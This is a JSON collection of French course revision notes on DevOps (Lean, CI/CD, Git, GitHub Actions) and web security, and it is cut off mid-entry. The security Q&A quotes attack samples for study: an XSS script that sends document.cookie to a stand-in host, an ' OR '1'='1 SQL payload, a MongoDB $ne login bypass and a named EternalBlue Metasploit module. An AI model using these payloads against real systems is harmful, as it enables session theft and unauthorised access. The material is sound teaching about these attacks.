{
  "DevOps-324 > Général": [
    {
      "name": "Lean",
      "file": "/public/markdown/DevOps-324/1-Lean.md",
      "content": "Lean Software Development (Source : DevOps Introduction) Les 7 principes Éliminer le gaspillage Renforcer l’apprentissage Décider le plus tard possible Livraison rapide Donner la responsabilité à l’équipe Développer l’intégrité Optimiser le tout Avantages Plus de fonctionnalités en moins de temps Réduction des activités inutiles → baisse des coûts Équipe plus autonome Lean vs Agile Lean : optimiser le système complet Agile : s’adapter au changement → Les deux visent l’amélioration continue. Bonnes pratiques Lean/Agile Cycles d’itérations Découper le projet en mini-cycles complets. Tester, livrer et recueillir des retours régulièrement. Réunions quotidiennes Synchroniser l’équipe Identifier les obstacles Ajuster le travail du jour Automatisation des tests Types de tests automatisables : unitaires intégration autres tests répétitifs Intégration Continue (CI) Intégrer le code fréquemment dans un repo partagé Compiler + exécuter des tests automatisés Détecter les bugs tôt = moins coûteux Livraison Continue (CD) Compiler automatiquement Tester automatiquement Générer un artefact prêt à déployer → Permet des sorties plus fréquentes et fiables. Engagement continu du client Évite de livrer un produit qui ne répond pas aux besoins Les stakeholders doivent être impliqués très tôt Engagement continu du client Évite de livrer un produit qui ne répond pas aux besoins Les stakeholders doivent être impliqués très tôt Conclusion Lean Vision minimaliste Accent sur les gens et l’amélioration continue Livraisons plus rapides, décisions de meilleure qualité"
    },
    {
      "name": "DevOps",
      "file": "/public/markdown/DevOps-324/2-DevOps.md",
      "content": "DevOps : principes essentiels (Source : DevOps Introduction) Définition Culture + pratiques + outils pour rapprocher : Dev (besoin de changement) Ops (besoin de stabilité) Problème : le \"wall of confusion\" Objectifs opposés entre Dev et Ops → manque de communication et d’outils intégrés. Comment DevOps résout ce problème ? Culture collaborative Automatisation CI CD Feedback continu CI/CD : les 8 étapes DevOps (Source : S-324 DevOps – 8 étapes) Plan – User stories, objectifs, critères d’acceptation Code – Développement, branches Git Build – Compilation, création des artefacts Test – Unitaires, intégration, performance Release – Préparation et documentation de la version Deploy – Déploiement (bleu/vert, canary, staging…) Operate – Surveillance, gestion incidents Monitor – Logs, métriques, amélioration continue CI vs CD (Source : DevOps 8 étapes) Continuous Integration (CI) À chaque push : Build Tests automatisés Analyse du code → Garantit que les changements n’introduisent pas de régressions. Continuous Delivery & Continuous Deployment (CD) Delivery : automatisé jusqu’au staging , déploiement en prod manuel. Deployment : déploiement automatique en production. Construire un plan CI/CD (Source : Plan CI/CD) Étapes clés Définir les objectifs (sécurité, rollback, fréquence, performance) Étudier l’architecture (frameworks, dépendances, type d’application) Automatiser les tests (unitaires, intégration, e2e) Identifier les environnements (dev / test / staging / prod) Intégrer la sécurité (scans, audit dépendances, lint) Documenter le pipeline complet"
    },
    {
      "name": "Git",
      "file": "/public/markdown/DevOps-324/3-Git.md",
      "content": "Git – principes fondamentaux (Source : DevOps Introduction + Git conventions) Workflow Git de base Working directory → Staging → Repository local → Repository distant Commandes clés : git add git commit git push git pull git reset Branches Git : conventions Branches régulières main : production develop : intégration test : QA Branches temporaires feature/... – nouvelles fonctionnalités bugfix/... – correction de bugs hotfix/... – correctif urgent en production release/... – préparation d’une version docs/... – documentation Règles de nommage minuscules, pas d’espace éviter . , ne pas terminer par / ne pas utiliser les noms réservés (HEAD, etc.) Versioning SemVer (Source : Git Conventions) Format : MAJEUR.MINOR.PATCH MAJEUR : rupture de compatibilité MINEUR : nouvelle fonctionnalité rétrocompatible PATCH : correction de bug Exemples : v1.0.0 v2.1.7 Git Stash : indispensable (Source : Git Stash) À quoi sert git stash ? Mettre de côté du travail sans commit : changement de branche pull test rapide Commandes git stash # ranger le travail git stash list # lister git stash apply # restaurer sans supprimer git stash pop # restaurer + supprimer git stash drop # supprimer un stash git stash clear # tout supprimer git stash push -m \"message\" git stash -u # inclure les non-trackés git stash -a # inclure absolument tout Ce qui doit aller dans Git / ce qui ne doit pas ✔️ À mettre dans Git Code source Fichiers de config modèle ( .env.example ) Images et ressources statiques ❌ À ne pas mettre Secrets / .env Dépendances ( node_modules , etc.) Artéfacts de build"
    }
  ],
  "DevOps-324 > Github Actions": [
    {
      "name": "Introduction",
      "file": "/public/markdown/DevOps-324/Github Actions/1-Introduction.md",
      "content": "Module 324 – GitHub Actions Introduction Source : S-324-03-GithubActions-Introduction.pdf Qu’est-ce que GitHub Actions GitHub Actions est une plateforme CI/CD permettant d'automatiser des tâches telles que tests, déploiements, formatage du code et analyses. Elle fonctionne via des workflows déclenchés par des événements ou une planification. Composants Workflow : fichier YAML décrivant l'automatisation. Event : déclencheur du workflow. Jobs : unités de travail regroupant des étapes. Steps : opérations exécutées séquentiellement. Actions : blocs réutilisables. Runner : machine d'exécution. Exemple minimal name: Exemple workflow on: push jobs: build: runs-on: ubuntu-latest steps: - uses: actions/checkout@v5 Événements Un workflow peut être déclenché par : push pull_request workflow_dispatch schedule Jobs Les jobs s'exécutent par défaut en parallèle. Ils doivent définir un runner. jobs: build: runs-on: ubuntu-latest Runners Deux types : runners GitHub hébergés runners self-hosted Steps Deux types : steps \"run\" (shell) steps \"uses\" (actions) Actions Exemple d’action officielle : - uses: actions/setup-node@v3 with: node-version: 18 Exemple d’action locale : - uses: ./.github/actions/ma-super-action Runs Exécution d'une commande shell : - run: npm ci - run: npm test Synthèse Workflow → Event → Jobs → Steps → Actions → Runner. Les steps exécutent l’automatisation. Les jobs peuvent être parallèles ou séquentiels."
    },
    {
      "name": "GitHub Actions Plus",
      "file": "/public/markdown/DevOps-324/Github Actions/2-GitHub Actions Plus.md",
      "content": "Module 324 – GitHub Actions Plus Source : S-324-04-GithubActions-Plus.pdf Variables Types : Variables personnalisées Variables par défaut (GITHUB_REPOSITORY, GITHUB_RUN_ID, etc.) Variables système Définition Niveau workflow env: VAR_GLOBAL: 'Valeur' Niveau job jobs: build: env: VAR_JOB: 'Valeur job' Niveau step steps: - env: VAR_STEP: 'Valeur step' Voir les variables présentes run: env Expressions Écrites dans : ${{ ... }} Exemple : if: ${{ env.MODE == 'production' }} Secrets Caractéristiques : définis dans Settings > Secrets sensibles à la casse limite 48 Ko ne doivent pas commencer par GITHUB_ Exemple d'utilisation : run: echo \"Secret: ${{ secrets.MON_SECRET }}\" Contextes Types principaux : github env job steps runner secrets vars Exemple : run: echo \"URL du repo : ${{ github.repositoryUrl }}\" Synthèse Les variables permettent de configurer un workflow. Les expressions ajoutent une logique conditionnelle. Les secrets permettent de gérer des données sensibles. Les contextes donnent accès aux informations d'exécution."
    }
  ],
  "Sécurité-183 > Questions": [
    {
      "name": "Index",
      "file": "/public/markdown/Sécurité-183/Questions/0-Index.md",
      "content": "<!-- 'NoAudio' --> Index des Questions de Révision - Sécurité 183 Ce fichier regroupe l'ensemble des questions traitées, classées par thématique. Cliquez sur une question pour accéder directement à sa réponse détaillée. 1. Authentification & Mots de passe LOGIN1 : À quoi sert le « salt » ? LOGIN2 : Exemples de mots de passe (Instant, Minutes, Années) LOGIN3 : Différence Hachage vs Chiffrement LOGIN4 : Démonstration temps de crack LOGIN5 : Étapes d'enregistrement sécurisé AUTH1 : Authentification multi-facteurs (MFA) 2. XSS & Manipulation du DOM XSS1 : Définition et implications XSS2 : Protection en Node.js XSS3 : Vol de mot de passe via XSS ? XSS4 : Analyse d'un script malveillant XSS5 : DOM Injection 3. Injections SQL & NoSQL ISQL1 : Vulnérabilité MongoDB ISQL2 : Injection SQL simple ( ' OR '1'='1 ) ISQL3 : Modification de données via Injection ISQL4 : Gestion des erreurs SQL en prod 4. Attaques DDoS & Défense DDOS1 : Définition DDOS2 : Rôle du TTL DNS DDOS3 : Techniques de mitigation 5. Sécurité des e-mails & images MAIL1 : Protection adresse e-mail MAIL2 : Cacher un copyright (Stéganographie) MAIL4 : Signature numérique d'image 6. Outils d’audit & Méthodologies OUTIL1 : 3 Outils d'audit web OUTIL2 : Metasploit OUTIL3 : Légalité des tests (Swisscom) OUTIL4 : Black Box Testing 7. OWASP OWASP1 : Broken Access Control OWASP2 : Cryptographic Failures OWASP3 : Top 5 OWASP + Insecure Design OWASP4 : Injection OWASP5 : Security Misconfiguration OWASP6 : Présentation OWASP 8. JWT (JSON Web Tokens) JWT1 : Structure d'un token JWT2 : Utilité et Stateless 9. Hashing & Algorithmes HASH1 : Pourquoi MD5 est obsolète 10. Divers & Sécurité générale MISC1 : Risques des librairies tierces MISC2 : Chiffrement (Repos vs Transit)"
    },
    {
      "name": "Authentification & Mots de passe",
      "file": "/public/markdown/Sécurité-183/Questions/1-Authentification & Mots de passe.md",
      "content": "<!-- INSTRUCTION_AUDIO: Lis chaque question puis immédiatement sa réponse. Adopte un ton formel, professionnel et motivant. Ne lis pas ce bloc. --> 1. Authentification & Mots de passe (Source : I183-TS2-ListeDesQuestions.pdf) <a id=\"login1\"></a> LOGIN1 — À quoi sert le « salt » ajouté à un mot de passe ? Un salt est une valeur aléatoire ajoutée au mot de passe avant son hachage. Il permet de renforcer massivement la sécurité en empêchant : l’utilisation de rainbow tables , car chaque hachage devient unique, la détection automatique de deux utilisateurs ayant le même mot de passe , les attaques basées sur des hachages prévisibles. Même si une base de données est volée, un attaquant ne peut pas pré-calculer des correspondances. Le salt doit être unique , long , aléatoire et stocké avec le hash , car il n’a pas besoin d’être secret. Il rend les Rainbow Tables inutiles car il faudrait générer une table entière pour chaque salt différent. <a id=\"login2\"></a> LOGIN2 — Exemples de mots de passe selon difficulté Cracké instantanément Mots de passe trop courts ou très connus. Ils sont présents dans toutes les bases de données d’attaques (rockyou.txt). Un pirate teste d’abord ces valeurs avant toute attaque plus coûteuse. Exemples : 123456 , password , admin , qwerty . Cracké en minutes/heures Combinaisons un peu variées mais basées sur des schémas prévisibles : ajout d’un chiffre en fin, remplacement de lettres évidentes (o → 0). Ces “stratégies” ne trompent pas les outils modernes. Exemples : Maison123 , P@ssw0rd! , Soleil2024 . Cracké en années Phrases secrètes longues, combinant plusieurs classes de caractères. Leur longueur augmente exponentiellement l’espace de recherche. Plus important encore : elles sont difficiles à deviner et à retenir pour un attaquant , mais faciles à retenir pour l’utilisateur . Exemples : J'aime.Manger.Des.Pommes.Rouges! , Correct-Horse-Battery-Staple . <a id=\"login3\"></a> LOGIN3 — Différence entre hachage et chiffrement Hachage : opération à sens unique . On utilise des algorithmes conçus pour être lents (bcrypt, Argon2) et qui résistent aux attaques GPU. Idéal pour les mots de passe, car un attaquant ne peut jamais “récupérer” la valeur d’origine. Récupération : Impossible mathématiquement. Seule méthode : Brute-force (essayer toutes les combinaisons). Chiffrement : opération réversible . Si une clé fuite, toute la donnée devient compromise. Utile pour la confidentialité : numéros de cartes, documents privés, fichiers sensibles. Récupération : Possible instantanément si l'on possède la clé de déchiffrement . Un système sécurisé doit savoir quand utiliser l’un ou l’autre . Les mots de passe ne doivent jamais être chiffrés. <a id=\"login4\"></a> LOGIN4 — Temps de crack d’un mot de passe Le temps de crack provient de la combinaison : de la taille de l’alphabet (65 caractères dans l’exemple), de la longueur du mot de passe (12), et de la puissance de l'attaquant (60 000 essais/s dans l'exemple, mais des millions sur du matériel industriel). Démonstration mathématique : Combinaisons : 65^12 ≈ 5,69 × 10^21 Temps (secondes) : (5,69 × 10^21) / 60 000 ≈ 9,48 × 10^16 secondes Temps (années) : (9,48 × 10^16) / (3600 × 24 × 365) ≈ 3 milliards d'années Les GPU modernes permettent de tester des milliards d’essais par seconde. C’est pour cela que : les mots de passe courts deviennent inutiles, les attaques de brute-force sont de plus en plus réalistes, et l’utilisation d’algorithmes de hash lents est absolument indispensable. <a id=\"login5\"></a> LOGIN5 — Étapes d’enregistrement d’un mot de passe Recevoir le mot de passe via un canal sécurisé ( HTTPS ). Générer un salt cryptographiquement sûr ( crypto.randomBytes ). Combiner le mot de passe au salt. Hacher avec un algorithme résistant au brute-force (bcrypt, Argon2, scrypt). Stocker uniquement le résultat : le hash, + le salt, + éventuellement le coût utilisé ( cost factor ). Ainsi, même si la base est volée : chaque mot de passe demande une attaque individuelle, et le coût pour un attaquant devient astronomique. <a id=\"auth1\"></a> AUTH1 — Authentification multi-facteurs L’AMF réduit fortement le risque de compromission en ajoutant une barrière physique ou biométrique. Elle repose sur l'utilisation d'au moins deux facteurs parmi : Ce que je sais (Mot de passe, PIN). Ce que je possède (Smartphone, Clé YubiKey, Carte à puce). Ce que je suis (Empreinte, FaceID, Iris). Même si un attaquant obtient le mot de passe : il ne possède pas le téléphone (TOTP, SMS, clé FIDO2), il ne possède pas l’empreinte ou le visage. Les systèmes modernes (Google, Microsoft, GitHub) recommandent FIDO2 qui est résilient même contre le phishing."
    },
    {
      "name": "XSS & Manipulation du DOM",
      "file": "/public/markdown/Sécurité-183/Questions/2-XSS & Manipulation du DOM.md",
      "content": "<!-- INSTRUCTION_AUDIO: Lis chaque question puis immédiatement sa réponse. Adopte un ton formel, professionnel et motivant. Ne lis pas ce bloc. --> 2. XSS & Manipulation du DOM (Source : I183-TS2-ListeDesQuestions.pdf) <a id=\"xss1\"></a> XSS1 — Définition Une faille XSS (pour Cross-Site Scripting) est une vulnérabilité de sécurité web qui permet à un attaquant d'injecter du code malveillant (généralement du JavaScript) dans une page web visitée par d'autres utilisateurs. Contrairement à d'autres attaques qui visent la base de données (comme les injections SQL), l'XSS vise directement les visiteurs du site. Le site web sert involontairement de \"complice\" pour livrer le code malveillant au navigateur de la victime. Une faille XSS permet à un attaquant : d’exécuter du JavaScript, dans la page consultée par la victime, sans toucher au serveur. C’est l’une des failles les plus fréquentes. Elle peut donner un accès complet à la session, modifier l’interface, ou détourner les formulaires. <a id=\"xss2\"></a> XSS2 — Protection en Node.js Protection efficace → combinaison de plusieurs approches : Échappement systématique du contenu avant affichage dans les templates. Frameworks modernes (React, Vue, Angular) qui échappent automatiquement le HTML injecté. Validation stricte côté serveur : Utiliser des middlewares comme Helmet ( app.use(helmet()) ) pour sécuriser les headers HTTP. supprimer les balises <script> , filtrer les événements HTML ( onclick , onload ). Application d’une Content Security Policy : empêche l’exécution de scripts inline, limite les sources autorisées, bloque les injections même si elles passent dans le DOM. Une bonne CSP peut neutraliser la majorité des XSS . <a id=\"xss3\"></a> XSS3 — Une XSS peut-elle voler un mot de passe ? Indirectement, oui. Une XSS peut : voler les cookies de session, voler les tokens JWT stockés dans le localStorage, intercepter les frappes, imiter un formulaire de connexion, envoyer toute donnée entrée par la victime vers un serveur pirate. En pratique, l’attaquant vole la session , ce qui équivaut à voler l'accès complet du compte. <a id=\"xss4\"></a> XSS4 — Effet du script fourni Le script : <script language=etmlscript>console.log(\"you have been hacked by Narut0\"); window.location.href=\"https://spoof.cookie.com?data=\"+document.cookie;</script> Si ce script est exécuté (malgré l'attribut language exotique) : Message console : Affiche \"you have been hacked by Narut0\" (Preuve de concept). Vol de session : Redirige l'utilisateur vers spoof.cookie.com . Exfiltration : Passe le contenu de document.cookie (contenant l'ID de session) en paramètre GET data . En plus : l’attaquant peut rejouer la session ailleurs, contourner la connexion, agir comme si c’était la victime. C’est l’un des scénarios XSS les plus classiques et les plus dangereux. <a id=\"xss5\"></a> XSS5 — DOM Injection Ici, la faille provient du côté client , souvent lorsque : on insère du HTML directement dans innerHTML , on manipule des chaînes non filtrées dans le DOM, on charge du contenu issu de l’URL sans validation. Ces attaques ne passent parfois même pas par le serveur , ce qui les rend difficiles à détecter."
    },
    {
      "name": "Injections",
      "file": "/public/markdown/Sécurité-183/Questions/3-Injections.md",
      "content": "<!-- INSTRUCTION_AUDIO: Lis chaque question puis immédiatement sa réponse. Adopte un ton formel, professionnel et motivant. Ne lis pas ce bloc. --> 3. Injections SQL & NoSQL (Source : I183-TS2-ListeDesQuestions.pdf) <a id=\"isql1\"></a> ISQL1 — MongoDB vulnérable aux injections ? Oui, et ces injections peuvent : contourner une authentification, modifier les filtres de recherche, exploiter les opérateurs $ne , $gt , $regex , $or . username: \"admin\" password: { \"$ne\": null } Trouve l'utilisateur 'admin' dont le mot de passe N'EST PAS nul. Dans des systèmes mal codés, une simple requête JSON peut retourner tous les utilisateurs . <a id=\"isql2\"></a> ISQL2 — ' OR '1'='1 Ce payload fonctionne car il force la condition SQL à être toujours vraie , ce qui : contourne la connexion, permet l’accès à des données sensibles, prouve que l’application n’utilise pas de requêtes préparées. Aujourd’hui, toute API doit utiliser : → paramètres préparés , → ORM sécurisés , → filtres stricts . <a id=\"isql3\"></a> ISQL3 — Modification de base par injection Si aucune protection n’est appliquée, une injection peut non seulement lire les données, mais aussi : modifier, supprimer, créer des tables. C’est la raison pour laquelle : les droits d’un compte SQL doivent être minimaux , aucune application ne devrait utiliser un compte admin sur la prod. <a id=\"isql4\"></a> ISQL4 — Masquer les erreurs SQL Une bonne API : masque les messages techniques, logue l’erreur côté serveur, renvoie un message simple comme \"Erreur interne\" . Configuration recommandée : Node.js : Définir NODE_ENV=production pour désactiver les stacktraces détaillées. MySQL : Configurer le driver avec debug: false . Code : Utiliser des blocs try/catch et ne jamais renvoyer l'objet error brut au client. Exposer une erreur SQL revient à dévoiler : le type de base, la structure des tables, les noms de colonnes, et parfois des chemins internes. Un cadeau pour un pirate."
    },
    {
      "name": "Attaques DDoS & Défense",
      "file": "/public/markdown/Sécurité-183/Questions/4-Attaques DDoS & Défense.md",
      "content": "<!-- INSTRUCTION_AUDIO: Lis chaque question puis immédiatement sa réponse. Adopte un ton formel, professionnel et motivant. Ne lis pas ce bloc. --> 4. DDoS (Source : I183-TS2-ListeDesQuestions.pdf) <a id=\"ddos1\"></a> DDOS1 — Définition Une attaque DDoS consiste à submerger un serveur par des milliers ou millions de requêtes simultanées. Objectif : rendre le service indisponible. <a id=\"ddos2\"></a> DDOS2 — Un TTL faible pour limiter l’impact Le TTL (Time To Live) DNS détermine la durée de cache d'une IP. Un TTL faible (ex: 60s) permet : de changer rapidement l'adresse IP du serveur si l'actuelle est attaquée (Null routing), de rediriger le trafic vers un système de mitigation (Scrubbing center) sans attendre des heures, de faciliter le DNS Round Robin pour répartir la charge sur plusieurs serveurs. Ce n’est pas une protection complète, mais un outil parmi d’autres. <a id=\"ddos3\"></a> DDOS3 — Méthodes de mitigation CDN : absorption du trafic. Rate limiting : limite les requêtes abusives. Load balancing : répartit la charge. Firewall applicatif : bloque les patterns suspects. Scrubbing centers : filtrage massif géré par les hébergeurs. Une bonne architecture combine plusieurs solutions."
    },
    {
      "name": "Sécurité des e-mails & images",
      "file": "/public/markdown/Sécurité-183/Questions/5-Sécurité des e-mails & images.md",
      "content": "<!-- INSTRUCTION_AUDIO: Lis chaque question puis immédiatement sa réponse. Adopte un ton formel, professionnel et motivant. Ne lis pas ce bloc. --> 5. E-mails & images (Source : I183-TS2-ListeDesQuestions.pdf) <a id=\"mail1\"></a> MAIL1 — Trois manières de protéger son adresse mail Obfuscation simple (ex: bob [at] mail.com ) Force : Très simple, lisible par l'humain. Faiblesse : Inefficace, les bots modernes comprennent cette syntaxe. Encodage HTML (Entités &#64; ) Force : Invisible pour l'utilisateur, affichage normal. Faiblesse : Protection faible, les bots décodent le HTML. Encodage JavaScript Force : L'adresse n'apparaît pas en clair dans le code source, nécessite un moteur JS. Faiblesse : Inaccessible si JS est désactivé, et les bots sophistiqués l'exécutent. Formulaire de contact Force : L'adresse n'est jamais exposée, protection antispam (Captcha). Faiblesse : Plus complexe à mettre en place (backend nécessaire). <a id=\"mail2\"></a> MAIL2 — Copyright dans une image Deux méthodes : Stéganographie : invisible, idéale pour prouver la paternité. Watermarking : visible, dissuasif contre la réutilisation. Les professionnels combinent souvent les deux. <a id=\"mail4\"></a> MAIL4 — Qui paie ? La signature numérique coûte : en matériel (clé privée sécurisée), en services de certification, en infrastructure. C’est donc en général l'organisation ou le professionnel qui a besoin de prouver l’authenticité d’une image."
    },
    {
      "name": "Outils d’audit & Méthodologies",
      "file": "/public/markdown/Sécurité-183/Questions/6-Outils d’audit & Méthodologies.md",
      "content": "<!-- INSTRUCTION_AUDIO: Lis chaque question puis immédiatement sa réponse. Adopte un ton formel, professionnel et motivant. Ne lis pas ce bloc. --> 6. Outils d’audit & méthodologies (Source : I183-TS2-ListeDesQuestions.pdf) <a id=\"outil1\"></a> OUTIL1 — Trois outils d’audit OWASP ZAP : open-source, idéal pour étudiants. Burp Suite : complet, intègre proxy, scanner, repeater. Nmap : analyse des ports, versioning, découverte réseau. <a id=\"outil2\"></a> OUTIL2 — Metasploit C'est un framework permettant : exploitation de failles connues (modules), création d’exploits personnalisés, automatisation des attaques. Outil puissant : utilisé uniquement en environnement autorisé. Exemple concret : Utiliser le module exploit/windows/smb/ms17_010_eternalblue pour prendre le contrôle d'un serveur Windows non patché. <a id=\"outil3\"></a> OUTIL3 — Metasploit sur Swisscom ? Non. Toute attaque sans autorisation : viole la loi suisse, peut mener à des poursuites pénales, viole les conditions d'utilisation des opérateurs. Seuls les tests autorisés (bug bounty, pentest contractuel) sont légaux. <a id=\"outil4\"></a> OUTIL4 — Black Box Testing Le testeur ne connaît rien de l’application : pas de code, pas de documentation, pas d’accès interne. Il simule le point de vue d’un pirate réel. Avantages : Conditions réalistes (simulation d'attaque externe). Indépendance vis-à-vis de la documentation (souvent fausse). Inconvénients : Couverture de test incomplète (on ne trouve pas tout). Plus lent (tâtonnement). Peut rater des failles évidentes dans le code source ( White Box préférable pour l'exhaustivité)."
    },
    {
      "name": "OWASP",
      "file": "/public/markdown/Sécurité-183/Questions/7-OWASP.md",
      "content": "<!-- INSTRUCTION_AUDIO: Lis chaque question puis immédiatement sa réponse. Adopte un ton formel, professionnel et motivant. Ne lis pas ce bloc. --> 7. OWASP (Source : I183-TS2-ListeDesQuestions.pdf) <a id=\"owasp1\"></a> OWASP1 — Broken Access Control Failles liées aux droits d’accès : Elles permettent souvent : consultation de données d'un autre utilisateur, modification non autorisée, escalade de privilèges. C’est la vulnérabilité la plus courante dans les applications modernes. <a id=\"owasp2\"></a> OWASP2 — Cryptographic Failures Problèmes liés : au mauvais choix d’algorithmes, à des clés trop courtes, à des données non chiffrées. Les conséquences peuvent être désastreuses : fuite massive de données, déchiffrement, accès non autorisé. <a id=\"owasp3\"></a> OWASP3 — Top 5 + Insecure Design Broken Access Control (Contrôle d’accès défaillant) C'est la nouvelle faille numéro 1 (elle était 5ème en 2017). Elle survient lorsque les restrictions sur ce que les utilisateurs authentifiés peuvent faire ne sont pas appliquées correctement. Concrètement : Un utilisateur normal change l'URL de app.com/user/123 vers app.com/user/124 et accède aux données de quelqu'un d'autre. Ou un utilisateur standard accède à une page /admin sans en avoir les droits. Cryptographic Failures (Défaillances cryptographiques) Auparavant appelée \"Exposition de données sensibles\". Cela concerne la protection des données au repos (base de données) et en transit (réseau). Concrètement : Stocker des mots de passe en clair, ne pas utiliser HTTPS, utiliser des algorithmes de hachage obsolètes (comme MD5 ou SHA1), ou mal gérer les clés de chiffrement. Injection Elle glisse de la 1ère à la 3ème place, mais reste critique. Cela regroupe les injections SQL, NoSQL (comme vu pour MongoDB), les injections de commandes OS, et désormais les failles XSS (Cross-Site Scripting) qui ont été fusionnées dans cette catégorie. Concrètement : Envoyer des données non fiables à un interpréteur qui les exécute comme une commande. Insecure Design (Conception non sécurisée) C'est une nouvelle catégorie apparue en 2021. Elle met l'accent sur le fait que la sécurité doit être pensée dès l'architecture, et pas seulement au niveau du code. Concrètement : Une application e-commerce qui ne limite pas le nombre de tentatives de paiement (permettant à un bot de tester des milliers de cartes volées). Ce n'est pas un bug de code, c'est un bug de logique métier/conception. Security Misconfiguration (Mauvaise configuration de sécurité) Elle remonte de la 6ème place. Avec la complexification des systèmes (Cloud, conteneurs), les erreurs de config sont fréquentes. Concrètement : Laisser les mots de passe par défaut (\"admin/admin\"), laisser le mode \"Debug\" activé en production (qui affiche des erreurs détaillées aux pirates), ou des permissions cloud (AWS S3) trop ouvertes. <a id=\"owasp4\"></a> OWASP4 — Injection Types : SQL NoSQL OS command LDAP Email header Template injection C’est l'une des failles les plus anciennes, mais toujours présente. <a id=\"owasp5\"></a> OWASP5 — Security Misconfiguration Erreurs fréquentes : debug actif en prod, ports/admin exposés, headers de sécurité absents, fichiers sensibles non supprimés. Très simple à exploiter, extrêmement courant. <a id=\"owasp6\"></a> OWASP6 — Qu’est-ce qu’OWASP ? OWASP est une organisation mondiale dédiée à la sécurité : Elle produit : guides pratiques, le célèbre OWASP Top 10 , une base complète de bonnes pratiques. OWASP ZAP (Scanner de vulnérabilités). OWASP Juice Shop (Application vulnérable pour l'entraînement). Web Security Testing Guide (WSTG) . Référence essentielle pour tout développeur web."
    },
    {
      "name": "JWT",
      "file": "/public/markdown/Sécurité-183/Questions/8-JWT.md",
      "content": "<!-- INSTRUCTION_AUDIO: Lis chaque question puis immédiatement sa réponse. Adopte un ton formel, professionnel et motivant. Ne lis pas ce bloc. --> 8. JWT (Source : I183-TS2-ListeDesQuestions.pdf) <a id=\"jwt1\"></a> JWT1 — Structure header.payload.signature header : algorithme + type, payload : données (claims), signature : garantit l’intégrité. <a id=\"jwt2\"></a> JWT2 — Utilité Le JWT (prononcé \"Jot\", pour JSON Web Token) est un standard ouvert utilisé pour échanger des informations de manière sécurisée entre deux parties. Permet une authentification stateless , évite l'utilisation de sessions serveur, facilite les architectures distribuées. Mais attention : Un JWT volé est valide jusqu’à expiration → ne jamais le stocker dans localStorage . Le problème des sessions classiques (Le \"Stateful\") Avant les JWT, la méthode standard fonctionnait ainsi : L'utilisateur se connecte. Le serveur crée une session et la stocke dans sa mémoire (RAM) ou sa base de données. Le serveur donne un ID de session (cookie) à l'utilisateur. À chaque requête de l'utilisateur, le serveur doit chercher cet ID dans sa mémoire pour savoir qui est l'utilisateur. Le problème : Si vous avez 1 million d'utilisateurs ou si vous utilisez plusieurs serveurs (cluster/microservices), synchroniser cette mémoire devient très lourd et complexe. La solution JWT (Le \"Stateless\") Avec le JWT, on cherche à rendre le client (le navigateur) autonome. L'utilisateur se connecte. Le serveur ne stocke rien en mémoire. Il crée un jeton (JWT) contenant les infos de l'utilisateur (ID, rôle, expiration) et le signe électroniquement. Il donne ce jeton à l'utilisateur. À chaque requête, l'utilisateur présente son badge (le JWT). Le serveur vérifie juste la signature du badge. Si la signature est valide, il sait qui est l'utilisateur sans avoir besoin de consulter une base de données. L'analogie du Festival Session classique : Vous donnez votre nom à l'entrée. Le vigile doit regarder sur une liste papier immense à chaque fois que vous voulez entrer dans une zone VIP. JWT : On vous donne un bracelet inaltérable à l'entrée. Le vigile regarde juste votre poignet. Si vous avez le bracelet, vous passez. Il n'a pas besoin de liste. Le piège de sécurité Le stockage du JWT est un sujet critique : Si vous stockez le JWT dans le LocalStorage du navigateur : Il est accessible via JavaScript. Une faille XSS permettrait à un attaquant de voler le jeton et de se faire passer pour vous. Si vous le stockez dans un Cookie HttpOnly : Le JavaScript ne peut pas le lire (protège du vol via XSS), mais vous devenez vulnérable aux failles CSRF (Cross-Site Request Forgery)."
    },
    {
      "name": "Hashing & Algorithmes",
      "file": "/public/markdown/Sécurité-183/Questions/9-Hashing & Algorithmes.md",
      "content": "<!-- INSTRUCTION_AUDIO: Lis chaque question puis immédiatement sa réponse. Adopte un ton formel, professionnel et motivant. Ne lis pas ce bloc. --> 9. Hashing & Algorithmes (Source : I183-TS2-ListeDesQuestions.pdf) <a id=\"hash1\"></a> HASH1 — Pourquoi MD5 est compromis ? MD5 (Message Digest 5) est considéré comme cryptographiquement brisé et dangereux à utiliser aujourd'hui pour la sécurité. Pour comprendre pourquoi, il faut revenir à la promesse de base d'une fonction de hachage : elle doit agir comme une empreinte digitale numérique. 1. Les Collisions (Le problème d'unicité) C'est la faille la plus critique pour la signature numérique. Le problème : Il est mathématiquement possible (et facile aujourd'hui) de créer deux fichiers différents qui produisent exactement la même empreinte MD5. La conséquence : L'intégrité n'est plus garantie. Un pirate peut remplacer un fichier sain par un fichier malveillant sans que la signature ne change (attaque des \"Jumeaux Maléfiques\"). 2. La Vitesse de calcul (Le problème des mots de passe) C'est la faille critique pour le stockage des identifiants. Le problème : MD5 est trop léger et rapide. Un ordinateur moderne peut calculer des milliards de hashs MD5 par seconde. La conséquence : Si une base de données est volée, les mots de passe hachés en MD5 sont cassés quasi instantanément par \"brute-force\" (essai de toutes les combinaisons). Il ne ralentit pas assez l'attaquant. 3. La Vulnérabilité prouvée (Le problème historique) C'est le constat d'échec technique. Le problème : L'algorithme est trop court (128 bits) et structurellement faible face aux méthodes de cryptanalyse actuelles. La conséquence : Des attaques réelles et célèbres (comme le malware Flame) ont déjà exploité ces failles pour contourner la sécurité de Windows. Ce n'est plus une théorie, l'algorithme est officiellement \"brisé\". Les algorithmes recommandés : bcrypt, Argon2, PBKDF2, SHA-256/512 (pour intégrité, pas pour mots de passe)."
    },
    {
      "name": "Divers & Sécurité générale",
      "file": "/public/markdown/Sécurité-183/Questions/10-Divers & Sécurité générale.md",
      "content": "<!-- INSTRUCTION_AUDIO: Lis chaque question puis immédiatement sa réponse. Adopte un ton formel, professionnel et motivant. Ne lis pas ce bloc. --> 10. Divers (Source : I183-TS2-ListeDesQuestions.pdf) <a id=\"misc1\"></a> MISC1 — Risques des librairies tierces Utiliser du code que l'on n'a pas écrit soi-même introduit plusieurs vecteurs d'attaque : Vulnérabilités connues (CVE) : Une librairie peut contenir une faille découverte plus tard (ex: Log4j). Si elle n'est pas mise à jour, l'application est vulnérable. Attaques de la Supply Chain : Un attaquant peut compromettre le compte d'un mainteneur de package (npm, PyPI) et injecter du code malveillant dans une mise à jour mineure. Abandon du projet : Si une librairie n'est plus maintenue, les futures failles ne seront jamais corrigées. Dépendances transitives : On installe une librairie A, qui installe B, qui installe C. Une faille dans C compromet A. Bonnes pratiques : Utiliser npm audit ou OWASP Dependency Check . Verrouiller les versions ( package-lock.json ). Minimiser le nombre de dépendances. <a id=\"misc2\"></a> MISC2 — Chiffrement au repos / en transit Il s'agit de protéger la donnée dans ses deux états principaux : En 